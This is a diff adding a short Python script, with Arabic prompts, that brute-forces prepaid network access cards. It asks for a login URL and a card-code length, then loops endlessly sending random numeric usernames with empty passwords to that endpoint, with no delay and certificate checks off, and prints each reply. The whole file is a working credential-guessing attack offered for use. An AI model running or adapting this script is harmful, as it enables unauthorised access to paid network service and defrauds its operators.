@@ -1,0 +1,46 @@
+import requests
+import random
+import time
+import os
+F = '\033[1;32m' 
+O ='\033[1;31m' 
+Almunharif_url1A = input (f'{F}رابط شبكتك : ')
+os.system('clear')
+Almunharif_headers2B = {
+    'Accept': '*/*',
+    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Connection': 'keep-alive',
+    'Referer': 'http://g.com/index.html',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
+}
+
+
+def Almunharif_generate3C_random4D_number5E(Almunharif_length6F):
+    return ''.join([str(random.randint(0, 9)) for _ in range(Almunharif_length6F)])
+
+Almunharif_num7G_length8H = int(input("أدخل عدد عدد الارقام الموجد في الكرت  حقك مثل (10) "))
+
+os.system('clear')
+
+
+
+
+
+while True:
+    Almunharif_random4M_number5N = Almunharif_generate3C_random4D_number5E(Almunharif_num7G_length8H)  
+    Almunharif_params6O = {
+        'username': Almunharif_random4M_number5N,
+        'password': '',  
+        'var': 'callBack',
+        'domain': '400K/900K'
+    }
+    
+    try:
+        
+        Almunharif_response7P = requests.get(Almunharif_url1A, params=Almunharif_params6O, headers=Almunharif_headers2B, verify=False)
+        print(f"Response for {Almunharif_random4M_number5N}: {Almunharif_response7P.text}")
+    except Exception as Almunharif_e8Q:
+        print(f"{O}error with {Almunharif_random4M_number5N}: {Almunharif_e8Q}")
+
+    
+    time.sleep(0)
